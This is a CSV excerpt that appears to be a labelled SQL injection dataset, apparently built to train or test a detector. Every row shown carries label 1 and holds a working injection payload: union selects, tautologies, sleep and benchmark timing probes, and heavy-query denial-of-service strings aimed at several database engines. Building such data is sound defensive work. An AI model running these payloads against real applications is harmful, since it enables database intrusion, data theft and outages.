row_index,payload_norm,label,sqli_type_hint
2310,-6165%' ) ) union all select 5384#,1,
2311,1 ) ) as msug where 3503 = 3503 and sleep ( 5 ) #,1,
2312,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
2313,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 'frpo' like 'frpo",1,
2314,"1"" ) where 2656 = 2656 or sleep ( 5 ) --",1,
2315,-7786' ) ) or 9323 = 9323#,1,
2316,"1'|| ( select 'gwxc' from dual where 3626 = 3626 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2317,-5534 or 1983 = 5721#,1,
2318,1' ) ) as grne where 9003 = 9003 order by 1--,1,
2319,"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ""wrbs"" like ""wrbs",1,
2320,"1"" ) ) as hkrh where 3060 = 3060 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
2321,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'rqyz' = 'rqyz",1,
2322,"-5439"" or 2559 = 4692 and ""dcrf"" like ""dcrf",1,
2323,"1"" ) as kndn where 9314 = 9314",1,
2324,-6030%' ) or 3038 = 3038,1,
2325,"1 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",1,
2326,"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) # tqmr",1,
2327,1 ) ) as tnhy where 1874 = 1874 and 2858 = 7324#,1,
2328,-1910' or 2624 = 3371 and 'umoy' = 'umoy,1,
2329,-7293' ) ) ) or 3038 = 3038,1,
2330,"select sleep ( 5 ) and ( ""%"" = """,1,
2331,"1 where 3410 = 3410 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
2332,"1' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
2333,"1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 6786 = 6786",1,
2334,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3#",1,
2335,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null#",1,
2336,"1' ) ) as lmsl where 3753 = 3753 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
2337,"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""hxgu"" = ""hxgu",1,
2338,1' ) as twny where 9580 = 9580,1,
2339,"-7738%"" ) union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1,
